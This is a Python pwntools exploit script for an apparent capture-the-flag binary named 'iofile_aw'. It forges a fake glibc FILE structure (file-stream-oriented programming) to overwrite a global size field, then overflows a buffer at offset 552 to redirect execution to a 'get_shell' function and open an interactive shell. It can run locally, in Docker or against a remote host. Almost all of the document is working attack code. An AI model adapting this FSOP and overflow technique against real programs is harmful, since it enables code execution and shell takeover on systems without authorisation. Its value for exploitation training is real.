#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('iofile_aw_patched')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def store_data(data):
    cmd = b"printf " + data
    io.sendlineafter(b"#", cmd)

def trigger_read(data):
    io.sendlineafter(b"#", b"read")
    io.sendline(data)


def solve():

    """
    Leverage FSOP to gain aaw 

    I'll overwrite the size field in the global array to a large value thus trigger an overflow!
    """

    payload = p64(0xfbad208b)
    payload += p64( 0 )  # _IO_read_ptr 
    payload += p64( 0 )  # _IO_read_end 
    payload += p64( 0 )  # _IO_read_base 
    payload += p64( 0 )  # _IO_write_base 
    payload += p64( 0 )  # _IO_write_ptr 
    payload += p64( 0 )  # _IO_write_end 
    payload += p64(exe.sym["size"])  # _IO_buf_base 

    store_data(payload)
    trigger_read(p64(0x500))

    offset = 552
    payload = flat({
        offset: [
            exe.sym["get_shell"]
        ]
    })

    io.sendlineafter(b"#", payload)
    io.sendlineafter(b"#", b"exit")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

